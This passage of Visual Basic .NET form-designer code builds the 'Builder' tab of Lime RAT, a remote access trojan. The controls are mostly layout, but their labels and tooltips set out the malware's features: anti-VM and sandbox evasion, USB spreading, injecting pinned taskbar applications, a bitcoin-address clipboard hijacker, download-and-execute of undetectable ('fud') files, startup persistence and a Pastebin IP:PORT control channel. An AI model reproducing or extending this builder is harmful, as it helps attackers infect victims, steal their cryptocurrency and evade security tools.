        Me.MetroTabPage3.Controls.Add(Me.MetroPanel3)
        Me.MetroTabPage3.Controls.Add(Me.MetroPanel2)
        Me.MetroTabPage3.HorizontalScrollbarBarColor = True
        Me.MetroTabPage3.Location = New System.Drawing.Point(4, 42)
        Me.MetroTabPage3.Name = "MetroTabPage3"
        Me.MetroTabPage3.Size = New System.Drawing.Size(1614, 501)
        Me.MetroTabPage3.Style = MetroFramework.MetroColorStyle.Lime
        Me.MetroTabPage3.TabIndex = 2
        Me.MetroTabPage3.Text = "Builder"
        Me.MetroTabPage3.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.MetroTabPage3.VerticalScrollbarBarColor = True
        '
        'chkRename
        '
        Me.chkRename.AutoSize = True
        Me.chkRename.Checked = True
        Me.chkRename.CheckState = System.Windows.Forms.CheckState.Checked
        Me.chkRename.FontSize = MetroFramework.MetroLinkSize.Medium
        Me.chkRename.Location = New System.Drawing.Point(1321, 326)
        Me.chkRename.Name = "chkRename"
        Me.chkRename.Size = New System.Drawing.Size(140, 19)
        Me.chkRename.Style = MetroFramework.MetroColorStyle.Lime
        Me.chkRename.TabIndex = 15
        Me.chkRename.Text = "Simple obfuscation"
        Me.chkRename.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.MetroToolTip1.SetToolTip(Me.chkRename, "Renaming namespace + classes + methods + parm")
        Me.chkRename.UseVisualStyleBackColor = True
        '
        'radioNET4
        '
        Me.radioNET4.AutoSize = True
        Me.radioNET4.Checked = True
        Me.radioNET4.Location = New System.Drawing.Point(1198, 360)
        Me.radioNET4.Name = "radioNET4"
        Me.radioNET4.Size = New System.Drawing.Size(66, 15)
        Me.radioNET4.Style = MetroFramework.MetroColorStyle.Lime
        Me.radioNET4.TabIndex = 13
        Me.radioNET4.TabStop = True
        Me.radioNET4.Text = ".NET 4.0"
        Me.radioNET4.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.radioNET4.UseVisualStyleBackColor = True
        '
        'radioNET2
        '
        Me.radioNET2.AutoSize = True
        Me.radioNET2.Location = New System.Drawing.Point(1198, 327)
        Me.radioNET2.Name = "radioNET2"
        Me.radioNET2.Size = New System.Drawing.Size(66, 15)
        Me.radioNET2.Style = MetroFramework.MetroColorStyle.Lime
        Me.radioNET2.TabIndex = 13
        Me.radioNET2.Text = ".NET 2.0"
        Me.radioNET2.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.radioNET2.UseVisualStyleBackColor = True
        '
        'MetroButton1
        '
        Me.MetroButton1.Location = New System.Drawing.Point(1198, 399)
        Me.MetroButton1.Name = "MetroButton1"
        Me.MetroButton1.Size = New System.Drawing.Size(245, 69)
        Me.MetroButton1.Style = MetroFramework.MetroColorStyle.Lime
        Me.MetroButton1.TabIndex = 12
        Me.MetroButton1.Text = "B u i l d"
        Me.MetroButton1.Theme = MetroFramework.MetroThemeStyle.Dark
        '
        'MetroPanel5
        '
        Me.MetroPanel5.BorderStyle = MetroFramework.Drawing.MetroBorderStyle.FixedSingle
        Me.MetroPanel5.Controls.Add(Me._icon)
        Me.MetroPanel5.Controls.Add(Me.PictureBox1)
        Me.MetroPanel5.HorizontalScrollbarBarColor = True
        Me.MetroPanel5.HorizontalScrollbarHighlightOnWheel = False
        Me.MetroPanel5.HorizontalScrollbarSize = 10
        Me.MetroPanel5.Location = New System.Drawing.Point(1198, 36)
        Me.MetroPanel5.Name = "MetroPanel5"
        Me.MetroPanel5.Size = New System.Drawing.Size(245, 249)
        Me.MetroPanel5.Style = MetroFramework.MetroColorStyle.Lime
        Me.MetroPanel5.TabIndex = 5
        Me.MetroPanel5.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.MetroPanel5.VerticalScrollbarBarColor = True
        Me.MetroPanel5.VerticalScrollbarHighlightOnWheel = False
        Me.MetroPanel5.VerticalScrollbarSize = 10
        '
        '_icon
        '
        Me._icon.AutoSize = True
        Me._icon.FontSize = MetroFramework.MetroLinkSize.Medium
        Me._icon.Location = New System.Drawing.Point(19, 26)
        Me._icon.Name = "_icon"
        Me._icon.Size = New System.Drawing.Size(51, 19)
        Me._icon.Style = MetroFramework.MetroColorStyle.Lime
        Me._icon.TabIndex = 11
        Me._icon.Text = "Icon"
        Me._icon.Theme = MetroFramework.MetroThemeStyle.Dark
        Me._icon.UseVisualStyleBackColor = True
        '
        'PictureBox1
        '
        Me.PictureBox1.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.PictureBox1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.PictureBox1.ErrorImage = Nothing
        Me.PictureBox1.InitialImage = Nothing
        Me.PictureBox1.Location = New System.Drawing.Point(54, 58)
        Me.PictureBox1.Name = "PictureBox1"
        Me.PictureBox1.Size = New System.Drawing.Size(138, 136)
        Me.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.PictureBox1.TabIndex = 2
        Me.PictureBox1.TabStop = False
        '
        'MetroPanel4
        '
        Me.MetroPanel4.BorderStyle = MetroFramework.Drawing.MetroBorderStyle.FixedSingle
        Me.MetroPanel4.Controls.Add(Me._numDelay)
        Me.MetroPanel4.Controls.Add(Me.MetroLabel11)
        Me.MetroPanel4.Controls.Add(Me.MetroLabel10)
        Me.MetroPanel4.Controls.Add(Me._dwnchk)
        Me.MetroPanel4.Controls.Add(Me._dwnlink)
        Me.MetroPanel4.Controls.Add(Me.MetroLabel9)
        Me.MetroPanel4.Controls.Add(Me._btc)
        Me.MetroPanel4.Controls.Add(Me.MetroLabel8)
        Me.MetroPanel4.Controls.Add(Me._pin)
        Me.MetroPanel4.Controls.Add(Me._usb)
        Me.MetroPanel4.Controls.Add(Me._anti)
        Me.MetroPanel4.HorizontalScrollbarBarColor = True
        Me.MetroPanel4.HorizontalScrollbarHighlightOnWheel = False
        Me.MetroPanel4.HorizontalScrollbarSize = 10
        Me.MetroPanel4.Location = New System.Drawing.Point(560, 36)
        Me.MetroPanel4.Name = "MetroPanel4"
        Me.MetroPanel4.Size = New System.Drawing.Size(581, 432)
        Me.MetroPanel4.Style = MetroFramework.MetroColorStyle.Lime
        Me.MetroPanel4.TabIndex = 4
        Me.MetroPanel4.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.MetroPanel4.VerticalScrollbarBarColor = True
        Me.MetroPanel4.VerticalScrollbarHighlightOnWheel = False
        Me.MetroPanel4.VerticalScrollbarSize = 10
        '
        '_numDelay
        '
        Me._numDelay.BackColor = System.Drawing.Color.FromArgb(CType(CType(34, Byte), Integer), CType(CType(34, Byte), Integer), CType(CType(34, Byte), Integer))
        Me._numDelay.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me._numDelay.ForeColor = System.Drawing.Color.FromArgb(CType(CType(153, Byte), Integer), CType(CType(153, Byte), Integer), CType(CType(153, Byte), Integer))
        Me._numDelay.Location = New System.Drawing.Point(121, 149)
        Me._numDelay.Minimum = New Decimal(New Integer() {3, 0, 0, 0})
        Me._numDelay.Name = "_numDelay"
        Me._numDelay.Size = New System.Drawing.Size(77, 22)
        Me._numDelay.TabIndex = 14
        Me._numDelay.Value = New Decimal(New Integer() {3, 0, 0, 0})
        '
        'MetroLabel11
        '
        Me.MetroLabel11.AutoSize = True
        Me.MetroLabel11.FontWeight = MetroFramework.MetroLabelWeight.Regular
        Me.MetroLabel11.Location = New System.Drawing.Point(220, 148)
        Me.MetroLabel11.Name = "MetroLabel11"
        Me.MetroLabel11.Size = New System.Drawing.Size(53, 19)
        Me.MetroLabel11.Style = MetroFramework.MetroColorStyle.Lime
        Me.MetroLabel11.TabIndex = 13
        Me.MetroLabel11.Text = "Second"
        Me.MetroLabel11.Theme = MetroFramework.MetroThemeStyle.Dark
        '
        'MetroLabel10
        '
        Me.MetroLabel10.AutoSize = True
        Me.MetroLabel10.FontWeight = MetroFramework.MetroLabelWeight.Regular
        Me.MetroLabel10.Location = New System.Drawing.Point(22, 148)
        Me.MetroLabel10.Name = "MetroLabel10"
        Me.MetroLabel10.Size = New System.Drawing.Size(43, 19)
        Me.MetroLabel10.Style = MetroFramework.MetroColorStyle.Lime
        Me.MetroLabel10.TabIndex = 11
        Me.MetroLabel10.Text = "Delay"
        Me.MetroLabel10.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.MetroToolTip1.SetToolTip(Me.MetroLabel10, "Best to set @35+ for runtime bypass")
        '
        '_dwnchk
        '
        Me._dwnchk.AutoSize = True
        Me._dwnchk.Checked = Global.Lime_RAT.My.MySettings.Default.once
        Me._dwnchk.DataBindings.Add(New System.Windows.Forms.Binding("Checked", Global.Lime_RAT.My.MySettings.Default, "once", True, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged))
        Me._dwnchk.FontSize = MetroFramework.MetroLinkSize.Medium
        Me._dwnchk.Location = New System.Drawing.Point(477, 326)
        Me._dwnchk.Name = "_dwnchk"
        Me._dwnchk.Size = New System.Drawing.Size(57, 19)
        Me._dwnchk.Style = MetroFramework.MetroColorStyle.Lime
        Me._dwnchk.TabIndex = 10
        Me._dwnchk.Text = "Once"
        Me._dwnchk.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.MetroToolTip1.SetToolTip(Me._dwnchk, " Run it just once")
        Me._dwnchk.UseVisualStyleBackColor = True
        '
        '_dwnlink
        '
        Me._dwnlink.DataBindings.Add(New System.Windows.Forms.Binding("Text", Global.Lime_RAT.My.MySettings.Default, "downloader", True, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged))
        Me._dwnlink.FontSize = MetroFramework.MetroTextBoxSize.Medium
        Me._dwnlink.ForeColor = System.Drawing.Color.FromArgb(CType(CType(142, Byte), Integer), CType(CType(188, Byte), Integer), CType(CType(0, Byte), Integer))
        Me._dwnlink.Location = New System.Drawing.Point(24, 363)
        Me._dwnlink.Name = "_dwnlink"
        Me._dwnlink.Size = New System.Drawing.Size(536, 36)
        Me._dwnlink.Style = MetroFramework.MetroColorStyle.Lime
        Me._dwnlink.TabIndex = 9
        Me._dwnlink.Text = Global.Lime_RAT.My.MySettings.Default.downloader
        Me._dwnlink.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.MetroToolTip1.SetToolTip(Me._dwnlink, " Download and execute, file MUST be fud")
        '
        'MetroLabel9
        '
        Me.MetroLabel9.AutoSize = True
        Me.MetroLabel9.FontWeight = MetroFramework.MetroLabelWeight.Regular
        Me.MetroLabel9.Location = New System.Drawing.Point(23, 322)
        Me.MetroLabel9.Name = "MetroLabel9"
        Me.MetroLabel9.Size = New System.Drawing.Size(83, 19)
        Me.MetroLabel9.Style = MetroFramework.MetroColorStyle.Lime
        Me.MetroLabel9.TabIndex = 7
        Me.MetroLabel9.Text = "Downloader"
        Me.MetroLabel9.Theme = MetroFramework.MetroThemeStyle.Dark
        '
        '_btc
        '
        Me._btc.DataBindings.Add(New System.Windows.Forms.Binding("Text", Global.Lime_RAT.My.MySettings.Default, "btc", True, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged))
        Me._btc.FontSize = MetroFramework.MetroTextBoxSize.Medium
        Me._btc.ForeColor = System.Drawing.Color.FromArgb(CType(CType(142, Byte), Integer), CType(CType(188, Byte), Integer), CType(CType(0, Byte), Integer))
        Me._btc.Location = New System.Drawing.Point(23, 252)
        Me._btc.Name = "_btc"
        Me._btc.Size = New System.Drawing.Size(536, 36)
        Me._btc.Style = MetroFramework.MetroColorStyle.Lime
        Me._btc.TabIndex = 8
        Me._btc.Text = Global.Lime_RAT.My.MySettings.Default.btc
        Me._btc.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.MetroToolTip1.SetToolTip(Me._btc, " If a bitcoin address is detected, It will repalce it with yours")
        '
        'MetroLabel8
        '
        Me.MetroLabel8.AutoSize = True
        Me.MetroLabel8.FontWeight = MetroFramework.MetroLabelWeight.Regular
        Me.MetroLabel8.Location = New System.Drawing.Point(22, 211)
        Me.MetroLabel8.Name = "MetroLabel8"
        Me.MetroLabel8.Size = New System.Drawing.Size(157, 19)
        Me.MetroLabel8.Style = MetroFramework.MetroColorStyle.Lime
        Me.MetroLabel8.TabIndex = 5
        Me.MetroLabel8.Text = "Bitcoin Grabber Address"
        Me.MetroLabel8.Theme = MetroFramework.MetroThemeStyle.Dark
        '
        '_pin
        '
        Me._pin.AutoSize = True
        Me._pin.Checked = Global.Lime_RAT.My.MySettings.Default.pin
        Me._pin.DataBindings.Add(New System.Windows.Forms.Binding("Checked", Global.Lime_RAT.My.MySettings.Default, "pin", True, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged))
        Me._pin.FontSize = MetroFramework.MetroLinkSize.Medium
        Me._pin.Location = New System.Drawing.Point(23, 105)
        Me._pin.Name = "_pin"
        Me._pin.Size = New System.Drawing.Size(250, 19)
        Me._pin.Style = MetroFramework.MetroColorStyle.Lime
        Me._pin.TabIndex = 7
        Me._pin.Text = "Spread [Pinned TaskBar Applications]"
        Me._pin.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.MetroToolTip1.SetToolTip(Me._pin, " All pinned application on bottom bar will be injected with the client.exe [NOT R" &
        "ecommend]")
        Me._pin.UseVisualStyleBackColor = True
        '
        '_usb
        '
        Me._usb.AutoSize = True
        Me._usb.Checked = Global.Lime_RAT.My.MySettings.Default.usb
        Me._usb.DataBindings.Add(New System.Windows.Forms.Binding("Checked", Global.Lime_RAT.My.MySettings.Default, "usb", True, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged))
        Me._usb.FontSize = MetroFramework.MetroLinkSize.Medium
        Me._usb.Location = New System.Drawing.Point(23, 67)
        Me._usb.Name = "_usb"
        Me._usb.Size = New System.Drawing.Size(104, 19)
        Me._usb.Style = MetroFramework.MetroColorStyle.Lime
        Me._usb.TabIndex = 6
        Me._usb.Text = "Spread [USB]"
        Me._usb.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.MetroToolTip1.SetToolTip(Me._usb, " If USB is detected, the client will inject itself to all files and folder [Recom" &
        "mend]")
        Me._usb.UseVisualStyleBackColor = True
        '
        '_anti
        '
        Me._anti.AutoSize = True
        Me._anti.Checked = Global.Lime_RAT.My.MySettings.Default.anti
        Me._anti.DataBindings.Add(New System.Windows.Forms.Binding("Checked", Global.Lime_RAT.My.MySettings.Default, "anti", True, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged))
        Me._anti.FontSize = MetroFramework.MetroLinkSize.Medium
        Me._anti.Location = New System.Drawing.Point(23, 29)
        Me._anti.Name = "_anti"
        Me._anti.Size = New System.Drawing.Size(150, 19)
        Me._anti.Style = MetroFramework.MetroColorStyle.Lime
        Me._anti.TabIndex = 5
        Me._anti.Text = "Anti Virtual Machine"
        Me._anti.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.MetroToolTip1.SetToolTip(Me._anti, " Anti : Sandboxie + Vmware + Virtualbox + Windows XP machines")
        Me._anti.UseVisualStyleBackColor = True
        '
        'MetroPanel3
        '
        Me.MetroPanel3.BackColor = System.Drawing.Color.FromArgb(CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer), CType(CType(17, Byte), Integer))
        Me.MetroPanel3.BorderStyle = MetroFramework.Drawing.MetroBorderStyle.FixedSingle
        Me.MetroPanel3.Controls.Add(Me.MetroLabel12)
        Me.MetroPanel3.Controls.Add(Me._path1)
        Me.MetroPanel3.Controls.Add(Me.MetroLabel7)
        Me.MetroPanel3.Controls.Add(Me._path2)
        Me.MetroPanel3.Controls.Add(Me.MetroLabel6)
        Me.MetroPanel3.Controls.Add(Me._drop)
        Me.MetroPanel3.Controls.Add(Me.MetroLabel5)
        Me.MetroPanel3.Controls.Add(Me._exe)
        Me.MetroPanel3.HorizontalScrollbarBarColor = True
        Me.MetroPanel3.HorizontalScrollbarHighlightOnWheel = False
        Me.MetroPanel3.HorizontalScrollbarSize = 10
        Me.MetroPanel3.Location = New System.Drawing.Point(3, 203)
        Me.MetroPanel3.Name = "MetroPanel3"
        Me.MetroPanel3.Size = New System.Drawing.Size(492, 265)
        Me.MetroPanel3.Style = MetroFramework.MetroColorStyle.Lime
        Me.MetroPanel3.TabIndex = 3
        Me.MetroPanel3.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.MetroPanel3.VerticalScrollbarBarColor = True
        Me.MetroPanel3.VerticalScrollbarHighlightOnWheel = False
        Me.MetroPanel3.VerticalScrollbarSize = 10
        '
        'MetroLabel12
        '
        Me.MetroLabel12.AutoSize = True
        Me.MetroLabel12.FontWeight = MetroFramework.MetroLabelWeight.Regular
        Me.MetroLabel12.Location = New System.Drawing.Point(24, 20)
        Me.MetroLabel12.Name = "MetroLabel12"
        Me.MetroLabel12.Size = New System.Drawing.Size(45, 19)
        Me.MetroLabel12.Style = MetroFramework.MetroColorStyle.Lime
        Me.MetroLabel12.TabIndex = 9
        Me.MetroLabel12.Text = "Install"
        Me.MetroLabel12.Theme = MetroFramework.MetroThemeStyle.Dark
        '
        '_path1
        '
        Me._path1.DataBindings.Add(New System.Windows.Forms.Binding("Text", Global.Lime_RAT.My.MySettings.Default, "Appdata", True, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged))
        Me._path1.FormattingEnabled = True
        Me._path1.ItemHeight = 23
        Me._path1.Items.AddRange(New Object() {"AppData", "Temp", "UserProfile"})
        Me._path1.Location = New System.Drawing.Point(162, 141)
        Me._path1.Name = "_path1"
        Me._path1.Size = New System.Drawing.Size(156, 29)
        Me._path1.Style = MetroFramework.MetroColorStyle.Lime
        Me._path1.TabIndex = 3
        Me._path1.Text = Global.Lime_RAT.My.MySettings.Default.Appdata
        Me._path1.Theme = MetroFramework.MetroThemeStyle.Dark
        '
        'MetroLabel7
        '
        Me.MetroLabel7.AutoSize = True
        Me.MetroLabel7.FontWeight = MetroFramework.MetroLabelWeight.Regular
        Me.MetroLabel7.Location = New System.Drawing.Point(24, 198)
        Me.MetroLabel7.Name = "MetroLabel7"
        Me.MetroLabel7.Size = New System.Drawing.Size(74, 19)
        Me.MetroLabel7.Style = MetroFramework.MetroColorStyle.Lime
        Me.MetroLabel7.TabIndex = 8
        Me.MetroLabel7.Text = "Sub Folder"
        Me.MetroLabel7.Theme = MetroFramework.MetroThemeStyle.Dark
        '
        '_path2
        '
        Me._path2.DataBindings.Add(New System.Windows.Forms.Binding("Text", Global.Lime_RAT.My.MySettings.Default, "subfolder", True, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged))
        Me._path2.Enabled = False
        Me._path2.FontSize = MetroFramework.MetroTextBoxSize.Medium
        Me._path2.ForeColor = System.Drawing.Color.FromArgb(CType(CType(142, Byte), Integer), CType(CType(188, Byte), Integer), CType(CType(0, Byte), Integer))
        Me._path2.Location = New System.Drawing.Point(162, 198)
        Me._path2.Name = "_path2"
        Me._path2.Size = New System.Drawing.Size(312, 36)
        Me._path2.Style = MetroFramework.MetroColorStyle.Lime
        Me._path2.TabIndex = 4
        Me._path2.Text = Global.Lime_RAT.My.MySettings.Default.subfolder
        Me._path2.Theme = MetroFramework.MetroThemeStyle.Dark
        '
        'MetroLabel6
        '
        Me.MetroLabel6.AutoSize = True
        Me.MetroLabel6.FontWeight = MetroFramework.MetroLabelWeight.Regular
        Me.MetroLabel6.Location = New System.Drawing.Point(24, 141)
        Me.MetroLabel6.Name = "MetroLabel6"
        Me.MetroLabel6.Size = New System.Drawing.Size(65, 19)
        Me.MetroLabel6.Style = MetroFramework.MetroColorStyle.Lime
        Me.MetroLabel6.TabIndex = 6
        Me.MetroLabel6.Text = "Directory"
        Me.MetroLabel6.Theme = MetroFramework.MetroThemeStyle.Dark
        '
        '_drop
        '
        Me._drop.AutoSize = True
        Me._drop.Location = New System.Drawing.Point(162, 18)
        Me._drop.Name = "_drop"
        Me._drop.Size = New System.Drawing.Size(80, 24)
        Me._drop.Style = MetroFramework.MetroColorStyle.Lime
        Me._drop.TabIndex = 1
        Me._drop.Text = "Off"
        Me._drop.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.MetroToolTip1.SetToolTip(Me._drop, " Install client to PC to run at startup")
        Me._drop.UseVisualStyleBackColor = True
        '
        'MetroLabel5
        '
        Me.MetroLabel5.AutoSize = True
        Me.MetroLabel5.FontWeight = MetroFramework.MetroLabelWeight.Regular
        Me.MetroLabel5.Location = New System.Drawing.Point(24, 86)
        Me.MetroLabel5.Name = "MetroLabel5"
        Me.MetroLabel5.Size = New System.Drawing.Size(69, 19)
        Me.MetroLabel5.Style = MetroFramework.MetroColorStyle.Lime
        Me.MetroLabel5.TabIndex = 4
        Me.MetroLabel5.Text = "File Name"
        Me.MetroLabel5.Theme = MetroFramework.MetroThemeStyle.Dark
        '
        '_exe
        '
        Me._exe.DataBindings.Add(New System.Windows.Forms.Binding("Text", Global.Lime_RAT.My.MySettings.Default, "filename", True, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged))
        Me._exe.Enabled = False
        Me._exe.FontSize = MetroFramework.MetroTextBoxSize.Medium
        Me._exe.ForeColor = System.Drawing.Color.FromArgb(CType(CType(142, Byte), Integer), CType(CType(188, Byte), Integer), CType(CType(0, Byte), Integer))
        Me._exe.Location = New System.Drawing.Point(162, 86)
        Me._exe.Name = "_exe"
        Me._exe.Size = New System.Drawing.Size(312, 36)
        Me._exe.Style = MetroFramework.MetroColorStyle.Lime
        Me._exe.TabIndex = 2
        Me._exe.Text = Global.Lime_RAT.My.MySettings.Default.filename
        Me._exe.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.MetroToolTip1.SetToolTip(Me._exe, " File name must end with .exe")
        '
        'MetroPanel2
        '
        Me.MetroPanel2.BorderStyle = MetroFramework.Drawing.MetroBorderStyle.FixedSingle
        Me.MetroPanel2.Controls.Add(Me.MetroTile1)
        Me.MetroPanel2.Controls.Add(Me._pastebin)
        Me.MetroPanel2.Controls.Add(Me.MetroLabel4)
        Me.MetroPanel2.HorizontalScrollbarBarColor = True
        Me.MetroPanel2.HorizontalScrollbarHighlightOnWheel = False
        Me.MetroPanel2.HorizontalScrollbarSize = 10
        Me.MetroPanel2.Location = New System.Drawing.Point(3, 36)
        Me.MetroPanel2.Name = "MetroPanel2"
        Me.MetroPanel2.Size = New System.Drawing.Size(492, 135)
        Me.MetroPanel2.Style = MetroFramework.MetroColorStyle.Lime
        Me.MetroPanel2.TabIndex = 2
        Me.MetroPanel2.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.MetroPanel2.VerticalScrollbarBarColor = True
        Me.MetroPanel2.VerticalScrollbarHighlightOnWheel = False
        Me.MetroPanel2.VerticalScrollbarSize = 10
        '
        'MetroTile1
        '
        Me.MetroTile1.Location = New System.Drawing.Point(341, 13)
        Me.MetroTile1.Name = "MetroTile1"
        Me.MetroTile1.Size = New System.Drawing.Size(133, 31)
        Me.MetroTile1.Style = MetroFramework.MetroColorStyle.Lime
        Me.MetroTile1.TabIndex = 4
        Me.MetroTile1.Text = "Check URL"
        Me.MetroTile1.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
        Me.MetroTile1.Theme = MetroFramework.MetroThemeStyle.Dark
        '
        '_pastebin
        '
        Me._pastebin.DataBindings.Add(New System.Windows.Forms.Binding("Text", Global.Lime_RAT.My.MySettings.Default, "pastebin", True, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged))
        Me._pastebin.FontSize = MetroFramework.MetroTextBoxSize.Medium
        Me._pastebin.FontWeight = MetroFramework.MetroTextBoxWeight.Light
        Me._pastebin.ForeColor = System.Drawing.Color.FromArgb(CType(CType(142, Byte), Integer), CType(CType(188, Byte), Integer), CType(CType(0, Byte), Integer))
        Me._pastebin.Location = New System.Drawing.Point(24, 58)
        Me._pastebin.Name = "_pastebin"
        Me._pastebin.Size = New System.Drawing.Size(450, 36)
        Me._pastebin.Style = MetroFramework.MetroColorStyle.Lime
        Me._pastebin.TabIndex = 0
        Me._pastebin.Text = Global.Lime_RAT.My.MySettings.Default.pastebin
        Me._pastebin.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.MetroToolTip1.SetToolTip(Me._pastebin, " It must be ""raw"" version, IP:PORT")
        '
        'MetroLabel4
        '
        Me.MetroLabel4.AutoSize = True
        Me.MetroLabel4.Location = New System.Drawing.Point(24, 22)
        Me.MetroLabel4.Name = "MetroLabel4"
        Me.MetroLabel4.Size = New System.Drawing.Size(85, 19)
        Me.MetroLabel4.Style = MetroFramework.MetroColorStyle.Lime
        Me.MetroLabel4.TabIndex = 2
        Me.MetroLabel4.Text = "Pastebin URL"
        Me.MetroLabel4.Theme = MetroFramework.MetroThemeStyle.Dark
        '
        'NotifyIcon1
        '
        Me.NotifyIcon1.Icon = CType(resources.GetObject("NotifyIcon1.Icon"), System.Drawing.Icon)
        Me.NotifyIcon1.Text = "LimeRAT"
        Me.NotifyIcon1.Visible = True
        '
        'BackgroundWorker1
        '
        '
        'LabelUpdate
        '
        Me.LabelUpdate.Enabled = True
        Me.LabelUpdate.Interval = 500
        '
        'MetroLabel1
        '
        Me.MetroLabel1.AutoSize = True
        Me.MetroLabel1.FontWeight = MetroFramework.MetroLabelWeight.Regular
        Me.MetroLabel1.Location = New System.Drawing.Point(3, 8)
        Me.MetroLabel1.Name = "MetroLabel1"
        Me.MetroLabel1.Size = New System.Drawing.Size(87, 19)
        Me.MetroLabel1.Style = MetroFramework.MetroColorStyle.Lime
        Me.MetroLabel1.TabIndex = 4
        Me.MetroLabel1.Text = "MetroLabel1"
        Me.MetroLabel1.Theme = MetroFramework.MetroThemeStyle.Dark
        '
        'MetroPanel1
        '
        Me.MetroPanel1.AutoSize = True
        Me.MetroPanel1.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink
        Me.MetroPanel1.Controls.Add(Me.MetroLabel2)
        Me.MetroPanel1.Controls.Add(Me.MetroToggle1)
        Me.MetroPanel1.Controls.Add(Me.MetroLabel1)
        Me.MetroPanel1.Dock = System.Windows.Forms.DockStyle.Bottom
        Me.MetroPanel1.HorizontalScrollbarBarColor = False
        Me.MetroPanel1.HorizontalScrollbarHighlightOnWheel = False
        Me.MetroPanel1.HorizontalScrollbarSize = 10
        Me.MetroPanel1.Location = New System.Drawing.Point(20, 633)
        Me.MetroPanel1.Name = "MetroPanel1"
        Me.MetroPanel1.Size = New System.Drawing.Size(1628, 33)
        Me.MetroPanel1.Style = MetroFramework.MetroColorStyle.Lime
        Me.MetroPanel1.TabIndex = 5
        Me.MetroPanel1.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.MetroPanel1.VerticalScrollbarBarColor = True
        Me.MetroPanel1.VerticalScrollbarHighlightOnWheel = False
        Me.MetroPanel1.VerticalScrollbarSize = 10
        '
        'MetroLabel2
        '
        Me.MetroLabel2.AutoSize = True
        Me.MetroLabel2.FontWeight = MetroFramework.MetroLabelWeight.Regular
        Me.MetroLabel2.Location = New System.Drawing.Point(1148, 8)
        Me.MetroLabel2.Name = "MetroLabel2"
        Me.MetroLabel2.Size = New System.Drawing.Size(102, 19)
        Me.MetroLabel2.Style = MetroFramework.MetroColorStyle.Lime
        Me.MetroLabel2.TabIndex = 6
        Me.MetroLabel2.Text = "NOTIFICATION"
        Me.MetroLabel2.Theme = MetroFramework.MetroThemeStyle.Dark
        '
        'MetroToggle1
        '
        Me.MetroToggle1.AutoSize = True
        Me.MetroToggle1.Checked = Global.Lime_RAT.My.MySettings.Default.Notif
        Me.MetroToggle1.DataBindings.Add(New System.Windows.Forms.Binding("Checked", Global.Lime_RAT.My.MySettings.Default, "Notif", True, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged))
        Me.MetroToggle1.FontWeight = MetroFramework.MetroLinkWeight.Light
        Me.MetroToggle1.Location = New System.Drawing.Point(1310, 6)
        Me.MetroToggle1.Name = "MetroToggle1"
        Me.MetroToggle1.Size = New System.Drawing.Size(80, 24)
        Me.MetroToggle1.Style = MetroFramework.MetroColorStyle.Lime
        Me.MetroToggle1.TabIndex = 5
        Me.MetroToggle1.Text = "Off"
        Me.MetroToggle1.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.MetroToggle1.UseVisualStyleBackColor = True
        '
        'MetroLabel3
        '
        Me.MetroLabel3.AutoSize = True
        Me.MetroLabel3.FontWeight = MetroFramework.MetroLabelWeight.Regular
        Me.MetroLabel3.Location = New System.Drawing.Point(51, 30)
        Me.MetroLabel3.Name = "MetroLabel3"
        Me.MetroLabel3.Size = New System.Drawing.Size(142, 19)
        Me.MetroLabel3.Style = MetroFramework.MetroColorStyle.Lime
        Me.MetroLabel3.TabIndex = 6
        Me.MetroLabel3.Text = "Checking connection.."
        Me.MetroLabel3.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.MetroLabel3.Theme = MetroFramework.MetroThemeStyle.Dark
        '
        'MetroProgressSpinner1
        '
        Me.MetroProgressSpinner1.Location = New System.Drawing.Point(23, 30)
        Me.MetroProgressSpinner1.Maximum = 100
        Me.MetroProgressSpinner1.Name = "MetroProgressSpinner1"
        Me.MetroProgressSpinner1.Size = New System.Drawing.Size(16, 16)
        Me.MetroProgressSpinner1.Style = MetroFramework.MetroColorStyle.Lime
        Me.MetroProgressSpinner1.TabIndex = 1
        Me.MetroProgressSpinner1.Theme = MetroFramework.MetroThemeStyle.Dark
        '
        'MetroStyleManager1
        '
        Me.MetroStyleManager1.Owner = Me
        Me.MetroStyleManager1.Style = MetroFramework.MetroColorStyle.Lime
        Me.MetroStyleManager1.Theme = MetroFramework.MetroThemeStyle.Dark
        '
        'BackgroundWorker2
        '
        '
        'MetroToolTip1
        '
        Me.MetroToolTip1.Style = MetroFramework.MetroColorStyle.Lime
        Me.MetroToolTip1.Theme = MetroFramework.MetroThemeStyle.Dark
        '
        'PingClients
        '
        Me.PingClients.Enabled = True
